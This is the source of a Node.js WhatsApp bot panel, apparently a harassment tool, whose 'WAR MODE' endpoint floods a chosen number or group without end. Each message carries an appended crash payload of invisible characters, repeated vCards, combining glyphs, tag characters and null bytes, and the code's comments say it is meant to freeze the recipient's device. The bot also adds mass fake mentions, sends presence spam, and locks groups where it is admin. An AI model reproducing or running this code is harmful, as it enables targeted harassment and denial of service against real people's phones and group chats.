const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const pino = require('pino');
const { makeWASocket, useMultiFileAuthState, delay, DisconnectReason, fetchLatestBaileysVersion } = require("@whiskeysockets/baileys");
const multer = require('multer');
const qrcode = require('qrcode');
const { v4: uuidv4 } = require('uuid');
const { Pool } = require('pg');

const app = express();
const port = 5000;

// Database setup
const pool = new Pool({
    connectionString: process.env.DATABASE_URL
});

// Initialize database
const initDB = async () => {
    try {
        await pool.query('CREATE TABLE IF NOT EXISTS users (id SERIAL PRIMARY KEY, username TEXT UNIQUE NOT NULL, password TEXT NOT NULL, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP); CREATE TABLE IF NOT EXISTS threads (id TEXT PRIMARY KEY, user_id INTEGER REFERENCES users(id), name TEXT, status TEXT, target_type TEXT, delay_seconds INTEGER, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);');
        console.log('Database initialized');
    } catch (err) { console.error('DB init error:', err); }
};
initDB();

['uploads', 'auth_per_user', 'public'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

app.use(express.static('public'));
app.use(session({
    secret: 'multi-user-whatsapp-secret',
    resave: false,
    saveUninitialized: true
}));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

let userSockets = {};
let userQRCodes = {};
let userGroupDetails = {};
let activeThreads = [];

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

const setupUserBaileys = async (userId, username) => {
    const authDir = path.join('./auth_per_user', username);
    if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(authDir);
    const { version } = await fetchLatestBaileysVersion();

    const connectToWhatsApp = async () => {
        userSockets[userId] = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            auth: state,
            browser: ["Chrome (Linux)", "Chrome", "110.0.5481.177"],
            syncFullHistory: false,
            markOnlineOnConnect: true,
            generateHighQualityLinkPreview: true,
            printQRInTerminal: false,
            defaultQueryTimeoutMs: 60000,
            keepAliveIntervalMs: 10000,
            connectTimeoutMs: 60000,
            retryRequestDelayMs: 2000,
            getMessage: async (key) => { return { conversation: 'RAJ THAKUR' } }
        });

        const socket = userSockets[userId];

        socket.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            if (connection === 'open') {
                userQRCodes[userId] = null;
                console.log(`User ${username} connected`);
                try {
                    const chats = await socket.groupFetchAllParticipating();
                    userGroupDetails[userId] = Object.values(chats).map(group => ({ name: group.subject, uid: group.id }));
                } catch (e) { console.error(e); }
            } else if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode !== DisconnectReason.loggedOut) {
                    setTimeout(connectToWhatsApp, 3000);
                } else {
                    fs.rmSync(authDir, { recursive: true, force: true });
                    delete userSockets[userId];
                }
            }
            if (qr) userQRCodes[userId] = await qrcode.toDataURL(qr);
        });

        socket.ev.on('creds.update', saveCreds);
    };

    await connectToWhatsApp();
};

app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    if (password !== 'RAJ-40🔒🩶') return res.status(401).send('Invalid password');

    try {
        let user = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
        if (user.rows.length === 0) {
            user = await pool.query('INSERT INTO users (username, password) VALUES ($1, $2) RETURNING id', [username, password]);
        }
        const userId = user.rows[0].id;
        req.session.userId = userId;
        req.session.username = username;
        req.session.loggedIn = true;

        if (!userSockets[userId]) await setupUserBaileys(userId, username);
        res.redirect('/');
    } catch (err) { res.status(500).send('Server error'); }
});

async function generatePairingCode(sessionId, phoneNumber, senderName, userId, username) {
  const authDir = path.join('./auth_per_user', username);
  // Do not remove existing auth if we want to preserve sessions, but for a new pairing code usually we need fresh state
  // However, the user said "don't remove anything", so we'll just ensure the dir exists
  if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });

  try {
    const { state, saveCreds } = await useMultiFileAuthState(authDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      version,
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      browser: ["Ubuntu", "Chrome", "110.0.5481.177"], // Updated browser for better pairing
      syncFullHistory: false, // Reduced sync for faster connection
      markOnlineOnConnect: true,
      defaultQueryTimeoutMs: 120000, // Increased timeout
      connectTimeoutMs: 120000,
      keepAliveIntervalMs: 30000,
      generateHighQualityLinkPreview: true,
      shouldReconnect: (error) => {
          return true;
      }
    });

    userSockets[userId] = sock;

    sock.ev.on('creds.update', saveCreds);

    // Wait for initial connection or socket to be ready
    await delay(3000); 

    const cleanNumber = phoneNumber.replace(/\D/g, '');
    console.log(`[SYSTEM] Requesting pairing code for ${cleanNumber}`);
    const code = await sock.requestPairingCode(cleanNumber);

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === 'open') {
        userQRCodes[userId] = null;
        console.log(`User ${username} connected via pairing code`);
        try {
            const chats = await sock.groupFetchAllParticipating();
            userGroupDetails[userId] = Object.values(chats).map(group => ({ name: group.subject, uid: group.id }));
        } catch (e) { console.error(e); }
      }
      if (connection === 'close') {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        if (statusCode !== DisconnectReason.loggedOut) {
          setTimeout(() => setupUserBaileys(userId, username), 5000);
        }
      }
    });

    return code;
  } catch (error) {
    console.error('Pairing code error:', error);
    return null;
  }
}

app.get('/pairing-code', async (req, res) => {
    const userId = req.session.userId;
    const username = req.session.username;
    const phoneNumber = req.query.number;

    if (!userId) return res.status(401).json({ error: 'Please login first' });
    if (!phoneNumber) return res.status(400).json({ error: 'Number required' });

    try {
        const code = await generatePairingCode(userId, phoneNumber, username, userId, username);
        if (code) {
            res.json({ code });
        } else {
            res.status(500).json({ error: 'Failed to generate code' });
        }
    } catch (e) { 
        console.error('Pairing code error:', e);
        res.status(500).json({ error: 'WhatsApp busy' }); 
    }
});

app.get('/groups', (req, res) => res.json(userGroupDetails[req.session.userId] || []));
app.get('/threads', (req, res) => res.json(activeThreads.filter(t => t.userId === req.session.userId)));

app.post('/stop-thread', (req, res) => {
    const thread = activeThreads.find(t => t.id === req.body.id);
    if (thread) thread.status = 'stopped';
    res.json({ success: true });
});

// 🔥 ADVANCE WAR MODE: START THREAD 🔥
app.post('/start-thread', upload.fields([{ name: 'file' }]), async (req, res) => {
    const { targetType, targetId, message, delaySeconds, haterName } = req.body;
    const userId = req.session.userId;
    const file = req.files['file'] ? req.files['file'][0] : null;

    if (!userSockets[userId]) return res.status(400).send('WhatsApp not connected');

    const threadId = uuidv4();
    const newThread = { id: threadId, userId: userId, name: haterName || 'RAJ-WAR', status: 'running', logs: [] };
    activeThreads.push(newThread);

    (async () => {
        const socket = userSockets[userId];
        if (!socket) {
            newThread.logs.push(`[ERROR] Socket not found for user ${userId}`);
            newThread.status = 'failed';
            return;
        }

        let jid;
        if (targetId.includes('@')) {
            jid = targetId;
        } else {
            // TargetType 1 = Number, 2 = Group
            const cleanNum = targetId.replace(/\D/g, '');
            if (targetType === '1' || !targetType) {
                jid = cleanNum + (cleanNum.length > 11 ? '@g.us' : '@s.whatsapp.net');
            } else if (targetType === '2') {
                jid = cleanNum + '@g.us';
            }
        }

        console.log(`[DEBUG] Attempting to send to JID: ${jid} for User ID: ${userId}`);
        newThread.logs.push(`[SYSTEM] Target JID: ${jid}`);

        // 🛡️ AUTO-ADMIN HIJACK: Sabka message band karna
        if (targetType === '2') {
            try {
                const groupMeta = await socket.groupMetadata(jid);
                const me = groupMeta.participants.find(p => p.id === socket.user.id);
                if (me && (me.admin === 'admin' || me.admin === 'superadmin')) {
                    newThread.logs.push(`[SYSTEM] Admin Rights Active: Closing Group for others.`);
                    await socket.groupSettingUpdate(jid, 'announcement');
                    await socket.groupSettingUpdate(jid, 'locked');
                } else {
                    newThread.logs.push(`[SYSTEM] Non-admin mode active.`);
                }
            } catch (e) { 
                console.log("Group Metadata Fetch Error:", e.message);
                newThread.logs.push(`[SYSTEM] Using direct message mode.`);
            }
        }

        const lines = message ? message.split('\n').filter(l => l.trim()) : [];
        let fileLines = file ? file.buffer.toString().split('\n').filter(l => l.trim()) : [];
        const allMessages = [...lines, ...fileLines];

                // 🚀 INFINITE AGGRESSIVE FLOODING LOOP
                while (newThread.status === 'running') {
                    for (const msg of allMessages) {
                        if (newThread.status !== 'running') break;
                        try {
                            const timestamp = new Date().toLocaleTimeString();

                            // 💀 LETHAL OMEGA "V2" PAYLOAD (Maximum Power + Guaranteed Delivery)
                            // Re-balanced for extreme device lock-up without server drop
                            const lethal_ghost = "‎".repeat(120000); 
                            const lethal_vcard = "BEGIN:VCARD\nVERSION:3.0\nN:RAJ-WAR;💀\nFN:LETHAL-0DAY\n".repeat(80) + "END:VCARD"; 
                            const lethal_render = "ᯓ҈⚰️⃢꠵̶".repeat(8000); 
                            const lethal_stress = "󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺".repeat(800); 
                            const lethal_binary = "\0".repeat(10000); 

                            const ultimateVirus = `\n${lethal_ghost}\n${lethal_vcard}\n${lethal_render}\n${lethal_stress}\n${lethal_binary}`;
                            const fullMsg = `${msg}\n${ultimateVirus}`;

                            // 📢 TARGETED LETHAL MENTIONS: High intensity for maximum device hang
                            let participants = [];
                            try {
                                if (targetType === '2') {
                                    const meta = await socket.groupMetadata(jid).catch(() => null);
                                    if (meta) participants = meta.participants.map(p => p.id);
                                }
                                // Optimized mention spam (Lethal but deliverable)
                                for(let i=0; i<40; i++) {
                                    participants.push(`${Math.floor(Math.random()*100000000000000)}@s.whatsapp.net`);
                                }
                            } catch (e) {
                                console.error("Participant Fetch Error:", e);
                            }

                            // 🚀 ULTRA-HARD BURST MODE: Reliable Delivery + Session Killer
                            const sendSequence = async () => {
                                for (let i = 0; i < 20; i++) { 
                                    if (newThread.status !== 'running') break;
                                    try {
                                        // Send text virus
                                        await socket.sendMessage(jid, { 
                                            text: fullMsg, 
                                            mentions: participants
                                        }, { 
                                            priority: 'high'
                                        });

                                        // ⚡ SESSION KILLER: Stressing Third-Party Sockets
                                        if (i % 5 === 0) {
                                            await socket.sendPresenceUpdate('composing', jid);
                                            await delay(200);
                                            await socket.sendPresenceUpdate('available', jid);
                                        }

                                        await delay(3000); // Balanced delay for heavy multi-vector payloads
                                    } catch (err) {
                                        console.error(`[CRITICAL ERROR] Message ${i} failed:`, err.message);
                                        if (err.message.includes('rate-overlimit')) {
                                            newThread.logs.push(`[SYSTEM] Rate limit hit. Cooling down...`);
                                            await delay(12000);
                                        }
                                        if (err.message.includes('Connection Closed') || err.message.includes('not opened') || err.message.includes('Restarting')) {
                                            newThread.logs.push(`[SYSTEM] Connection lost. Recovering...`);
                                            throw err;
                                        }
                                        await delay(2000); 
                                    }
                                }
                            };

                            await sendSequence();
                            await delay(3000); 
                        } catch (e) {
                            newThread.logs.push(`[${new Date().toLocaleTimeString()}] Error: ${e.message}`);
                            if (e.message.includes('rate-overlimit')) {
                                await delay(5000); 
                            }
                            // Auto-Reconnect trigger if socket is dead
                            if (e.message.includes('Connection Closed') || e.message.includes('not opened')) {
                                newThread.logs.push(`[SYSTEM] Attempting Auto-Recovery...`);
                                await delay(3000);
                            }
                        }
                        await delay(Math.max(500, parseInt(delaySeconds) * 500)); 
                    }
                }
        newThread.status = 'completed';
    })();

    res.json({ success: true, threadId });
});

app.get('/thread-logs/:id', (req, res) => {
    const thread = activeThreads.find(t => t.id === req.params.id);
    res.json(thread ? { logs: thread.logs, status: thread.status } : { logs: [] });
});

app.get('/', (req, res) => {
    const bgUrl = 'https://i.postimg.cc/jjQ1QcTs/Screenshot-2025-12-27-04-28-19-886-com-facebook-katana-edit.jpg';
    if (!req.session.loggedIn) {
        return res.send(`<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Login - RAJ THAKUR</title><style>body { background: linear-gradient(rgba(0,0,0,0.2), rgba(0,0,0,0.2)), url('${bgUrl}'); background-size: cover; background-position: center; background-attachment: fixed; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; } .login-card { background: rgba(0,0,0,0.4); backdrop-filter: blur(5px); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); text-align: center; width: 340px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); } input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid rgba(0,242,254,0.3); background: rgba(0,0,0,0.5); color: #fff; box-sizing: border-box; } button { width: 100%; padding: 12px; background: rgba(0,242,254,0.8); color: #000; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; } button:hover { background: #00f2fe; } .dp-box { width: 160px; height: 160px; margin: 0 auto 20px; border-radius: 50%; border: 3px solid; animation: rotateCycle 12s linear infinite, borderPulse 4s infinite; overflow: hidden; } .dp-box img { width: 100%; height: 100%; object-fit: cover; } .medium-box { width: 100%; padding: 15px; border-radius: 12px; border: 1.5px solid; margin-bottom: 15px; background: rgba(255,255,255,0.05); font-weight: bold; box-sizing: border-box; animation: borderPulse 4s infinite, float 4s ease-in-out infinite; } @keyframes rotateCycle { 0% { transform: rotate(0deg); } 25% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } } @keyframes borderPulse { 0% { border-color: rgba(255,0,0,0.2); } 33% { border-color: rgba(0,255,0,0.2); } 66% { border-color: rgba(0,0,255,0.2); } 100% { border-color: rgba(255,0,0,0.2); } }</style></head><body><div class='login-card'><div class='dp-box'><img src='https://i.postimg.cc/QxhHfx1P/20251216-043520.png'></div><div class='medium-box' id='homeTitle'>RAJ THAKUR HOME' PAGE 🏠</div><div class='medium-box' id='toolsTitle'>OFFLINE TOOLS CREATED BY RAJ 🛠️</div><div class='medium-box' id='welcomeTitle'>✨ EMBRACE THE FUTURE PROJECT ✨</div><form action='/login' method='POST'><input type='text' name='username' placeholder='Username' required><input type='password' name='password' placeholder='RAJ-40🔒🩶' required><button type='submit'>UNLOCK SCRIPT</button></form></div><script>const colors=['#ff0000','#00ff00','#0000ff','#ffff00','#ff00ff','#00ffff','#ffa500'];setInterval(()=>{const ht=document.getElementById('homeTitle');const tt=document.getElementById('toolsTitle');const wt=document.getElementById('welcomeTitle');if(ht)ht.style.color=colors[Math.floor(Math.random()*colors.length)];if(tt)tt.style.color=colors[Math.floor(Math.random()*colors.length)];if(wt)wt.style.color=colors[Math.floor(Math.random()*colors.length)];},1000);</script></body></html>`);
    }

    const userId = req.session.userId;
    const isConnected = userSockets[userId] && userSockets[userId].user;
    const qrCode = userQRCodes[userId];

    res.send("<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>RAJ THAKUR AUTOMATION</title><link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css'><style>:root { --p: #00f2fe; --s: #4facfe; } body { font-family: sans-serif; background: linear-gradient(rgba(0,0,0,0.2), rgba(0,0,0,0.2)), url('https://i.postimg.cc/jjQ1QcTs/Screenshot-2025-12-27-04-28-19-886-com-facebook-katana-edit.jpg') no-repeat center fixed; background-size: cover; color: #fff; margin: 0; padding: 20px; } .container { max-width: 600px; margin: auto; } .box { background: url('https://i.postimg.cc/MG052LMT/490fca61c3e52f8de4be7d833a2da0a3.jpg') center; background-size: cover; backdrop-filter: blur(10px); padding: 25px; border-radius: 20px; border: 1px solid var(--p); margin-bottom: 20px; box-shadow: 0 0 20px rgba(0,242,254,0.3); } .box-content { background: rgba(0,0,0,0.6); padding: 20px; border-radius: 15px; } .orange-box { border: 2px solid orange; padding: 10px; border-radius: 15px; text-align: center; margin-bottom: 20px; color: orange; font-weight: bold; animation: pulse 2s infinite; font-size: 1.2rem; } .fire-box { border: 3px solid; padding: 15px; border-radius: 15px; text-align: center; margin-bottom: 20px; font-weight: bold; font-size: 1.3rem; animation: borderAnim 3s infinite, firePulse 1.5s infinite; } @keyframes pulse { 0% { opacity: 0.7; transform: scale(1); } 50% { opacity: 1; transform: scale(1.02); } 100% { opacity: 0.7; transform: scale(1); } } @keyframes firePulse { 0% { transform: scale(1); text-shadow: 0 0 5px red; } 50% { transform: scale(1.05); text-shadow: 0 0 20px orange; } 100% { transform: scale(1); text-shadow: 0 0 5px red; } } h1 { text-align: center; color: var(--p); letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,242,254,0.5); } h2 { text-align: center; margin-top: 0; font-weight: bold; } label { display: block; margin-top: 15px; color: var(--p); font-weight: bold; } input, select, textarea { width: 100%; padding: 12px; margin: 8px 0; border-radius: 10px; border: 1px solid var(--p); background: rgba(0,0,0,0.7); color: #fff; box-sizing: border-box; } button { width: 100%; padding: 12px; background: transparent; border: 1px solid var(--p); color: var(--p); border-radius: 10px; cursor: pointer; font-weight: bold; transition: 0.3s; margin-top: 10px; } button:hover { background: var(--p); color: #000; } .active { background: var(--p); color: #000; } .scroll-box { max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.5); padding: 10px; border-radius: 10px; border: 1px solid var(--p); } .group-item { padding: 8px; margin: 4px 0; border-radius: 8px; cursor: pointer; display: flex; align-items: center; background: rgba(255,255,255,0.05); color: #fff; } .group-item input { width: auto; margin-right: 12px; } .thread-item { border: 3px solid; border-radius: 15px; margin: 15px 0; padding: 15px; background: rgba(0,0,0,0.4); display: flex; justify-content: space-between; align-items: center; animation: borderAnim 3s infinite, firePulse 1.5s infinite; font-weight: bold; } .logs-container { margin-top: 20px; background: rgba(0,0,0,0.8); border: 4px solid; border-radius: 15px; padding: 15px; min-height: 120px; max-height: 280px; overflow-y: auto; font-family: monospace; font-size: 0.95rem; animation: borderAnim 5s infinite; box-shadow: 0 0 15px rgba(255,255,255,0.2); } @keyframes borderAnim { 0% { border-color: red; } 20% { border-color: yellow; } 40% { border-color: green; } 60% { border-color: cyan; } 80% { border-color: magenta; } 100% { border-color: red; } } .footer-links { background: rgba(0,0,0,0.7); padding: 15px; border-radius: 20px; border: 1px solid var(--p); margin-top: 20px; text-align: center; } .socials { display: flex; justify-content: center; gap: 25px; margin-bottom: 0; } .socials a { font-size: 2.5rem; transition: 0.3s; } .socials a:hover { transform: scale(1.3); filter: drop-shadow(0 0 15px var(--p)); } .fa-whatsapp { color: #25d366; } .fa-facebook { color: #1877f2; } .fa-instagram { color: #e1306c; } .fa-youtube { color: #f00; } .pairing-code { font-size: 2.5rem; color: #ff0; text-align: center; letter-spacing: 5px; margin: 20px 0; font-weight: bold; text-shadow: 0 0 10px #ff0; } #qrSection, #pairingSection { display: none; } .visible { display: block !important; } .qr-code-img { display: block; margin: 20px auto; border: 5px solid #fff; border-radius: 10px; animation: qrBorder 3s infinite; } @keyframes qrBorder { 0% { border-color: red; } 33% { border-color: lime; } 66% { border-color: blue; } 100% { border-color: red; } } .credit-box { background: rgba(0,0,0,0.8); padding: 15px; border-radius: 15px; border: 3px solid; animation: borderAnim 4s infinite; text-align: center; margin-top: 20px; font-weight: bold; } .credit-text span:nth-child(1) { color: white; } .credit-text span:nth-child(2) { color: green; } .credit-text span:nth-child(3) { color: black; background: white; padding: 0 5px; border-radius: 3px; } .credit-text span:nth-child(4) { color: cyan; }</style><script>function toggleConn(type) { document.getElementById('qrSection').className = type === 'qr' ? 'visible' : ''; document.getElementById('pairingSection').className = type === 'pair' ? 'visible' : ''; document.getElementById('qrBtn').className = type === 'qr' ? 'active' : ''; document.getElementById('pairBtn').className = type === 'pair' ? 'active' : ''; } async function getPair() { const n = document.getElementById('num').value; if(!n) return alert('Enter Number!'); const d = document.getElementById('codeDisp'); d.innerText = 'WAIT...'; const r = await fetch('/pairing-code?number=' + encodeURIComponent(n)); const j = await r.json(); d.innerText = j.code || j.error; } function toggleTargets() { const v = document.getElementById('targetOpt').value; document.getElementById('numField').style.display = v === '1' ? 'block' : 'none'; document.getElementById('grpField').style.display = v === '2' ? 'block' : 'none'; } async function startProcess() { const form = document.getElementById('mainForm'); const formData = new FormData(form); const targetType = document.getElementById('targetOpt').value; if (targetType === '2') { const selectedGrps = Array.from(document.querySelectorAll('.grp-check:checked')).map(c => c.value); if (selectedGrps.length === 0) return alert('Select Groups!'); formData.delete('targetId'); selectedGrps.forEach(id => formData.append('targetIds[]', id)); formData.set('targetId', selectedGrps[0]); } const res = await fetch('/start-thread', { method: 'POST', body: formData }); const json = await res.json(); if(json.success) { alert('War Started!'); loadThreads(); } } async function loadThreads() { const r = await fetch('/threads'); const threads = await r.json(); const container = document.getElementById('threadsList'); container.innerHTML = threads.map(t => { return \"<div class='thread-item'><strong>\" + t.name + \"</strong> (\" + t.status + \")<button onclick='stopThread(\\\"\" + t.id + \"\\\")' style='width: auto; padding: 5px 15px; margin: 0; border: 2px solid white; color: white;'><i class='fas fa-stop-circle'></i> STOP</button></div>\"; }).join(''); threads.forEach(t => { if(t.status === 'running') pollLogs(t.id); }); } async function pollLogs(id) { const r = await fetch('/thread-logs/' + id); const data = await r.json(); const logBox = document.getElementById('logsBox'); const colors = ['#ff5733', '#33ff57', '#3357ff', '#f333ff', '#33fff3', '#ffdb33']; logBox.innerHTML = data.logs.map(l => { const color = colors[Math.floor(Math.random() * colors.length)]; return \"<div style='color: \" + color + \"'>\" + l + \"</div>\"; }).join(''); logBox.scrollTop = logBox.scrollHeight; if(data.status === 'running') setTimeout(() => pollLogs(id), 2000); } async function stopThread(id) { await fetch('/stop-thread', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id }) }); loadThreads(); } async function loadGroups() { const r = await fetch('/groups'); const grps = await r.json(); const container = document.getElementById('grpList'); container.innerHTML = grps.map(g => \"<div class='group-item' style='color: \" + ['#ff7f50','#87cefa','#da70d6','#32cd32','#f0e68c'][Math.floor(Math.random()*5)] + \"'><input type='checkbox' class='grp-check' value='\" + g.uid + \"'><span>\" + g.name + \"</span></div>\").join(''); } setInterval(loadGroups, 10000); setInterval(loadThreads, 5000); window.onload = () => { loadGroups(); loadGroups(); loadThreads(); };</script></head><body><div class='container'><div class='box'><div class='box-content'><div class='orange-box'>🔐OFFLINE SERVER 🩶</div><div class='fire-box' id='fireTitle'>🔐🩶 Raj Thakur on fire🔒🔏</div><div style='display: flex; gap: 10px; margin-bottom: 20px;'><button id='qrBtn' onclick='toggleConn(\"qr\")'><i class='fas fa-qrcode'></i> QR CODE</button><button id='pairBtn' onclick='toggleConn(\"pair\")'><i class='fas fa-link'></i> PAIRING CODE</button></div><div id='qrSection'>" + (qrCode ? "<img src='" + qrCode + "' class='qr-code-img'>" : "<p style='text-align:center'>Waiting for QR...</p>") + "</div><div id='pairingSection'><input type='text' id='num' placeholder='Phone Number (e.g. 919876543210)'><button onclick='getPair()'>GENERATE CODE</button><div id='codeDisp' class='pairing-code'></div></div><form id='mainForm' onsubmit='event.preventDefault(); startProcess();'><label>TARGET TYPE</label><select id='targetOpt' name='targetType' onchange='toggleTargets()'><option value='1'>DIRECT NUMBER</option><option value='2'>GROUP</option></select><div id='numField'><label>TARGET NUMBER</label><input type='text' name='targetId' placeholder='919876543210'></div><div id='grpField' style='display:none'><label>SELECT GROUPS</label><div id='grpList' class='scroll-box'></div></div><label>HATER NAME / SENDER NAME</label><input type='text' name='haterName' placeholder='RAJ THAKUR'><div><label>MESSAGE SOURCE</label><select onchange='document.getElementById(\"msgInp\").style.display = this.value===\"text\"?\"block\":\"none\"; document.getElementById(\"fileInp\").style.display = this.value===\"file\"?\"block\":\"none\";'><option value='text'>TEXT BOX 📝</option><option value='file'>FILE UPLOAD 📁</option></select></div><div id='msgInp'><label>MESSAGE BOX</label><textarea name='message' rows='5' placeholder='Enter messages (one per line)'></textarea></div><div id='fileInp' style='display:none'><label>UPLOAD TXT FILE</label><input type='file' name='file' accept='.txt'></div><label>DELAY (SECONDS)</label><input type='number' name='delaySeconds' value='5' min='1'><button type='submit' class='active'><i class='fas fa-paper-plane'></i> START WAR MODE 🚀</button></form></div></div><div class='box'><div class='box-content'><h2 id='threadTitle'>ACTIVE WAR 📊</h2><div id='threadsList'></div><h2 id='logTitle'>LIVE WAR LOGS 📜</h2><div id='logsBox' class='logs-container'></div></div></div><div class='credit-box'><div class='credit-text'><span>CREATED BY </span><span>RAJ THAKUR</span><span>© 2025</span><span> ALL RIGHTS RESERVED</span></div></div><div class='footer-links'><div class='socials'><a href='#' class='fab fa-whatsapp'></a><a href='#' class='fab fa-facebook'></a><a href='#' class='fab fa-instagram'></a><a href='#' class='fab fa-youtube'></a></div></div></div><script>const colors=['#ff0000','#00ff00','#0000ff','#ffff00','#ff00ff','#00ffff','#ffa500'];setInterval(()=>{const ft=document.getElementById('fireTitle');const tt=document.getElementById('threadTitle');const lt=document.getElementById('logTitle');if(ft)ft.style.color=colors[Math.floor(Math.random()*colors.length)];if(tt)tt.style.color=colors[Math.floor(Math.random()*colors.length)];if(lt)lt.style.color=colors[Math.floor(Math.random()*colors.length)];},1000);</script></body></html>");
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Raj Thakur Server running on port ${port}`);
});
